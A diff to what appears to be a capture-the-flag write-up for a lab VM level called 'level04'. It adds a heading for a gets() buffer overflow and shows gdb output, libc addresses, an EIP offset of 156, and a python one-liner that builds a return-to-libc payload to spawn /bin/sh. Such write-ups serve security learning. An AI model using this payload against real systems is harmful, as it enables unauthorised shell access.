@@ -6,6 +6,11 @@
 ```
 scp -P 4242 level04@192.168.56.109:level04 binary/
 ```
+
+## Buffer overflow : gets exploit
+
+**objective** : overflow buffer to execute `/bin/sh`
+
 ```
 (gdb) start
 Temporary breakpoint 1 at 0x80486cd
@@ -33,7 +38,7 @@ Temporary breakpoint 1, 0x080486cd in main ()
 `exit()` address : 0xf7ee45c4\
 `/bin/sh` address : 0xf7f897ec\
 
-- offset = 156
+- eip offset found : 156
 
 ```
 $ python -c 'print "\x42" * 156 + "\xd0\xae\xe6\xf7" + "\xc4\x45\xee\xf7" + "\xec\x97\xf8\xf7"' > /tmp/level04
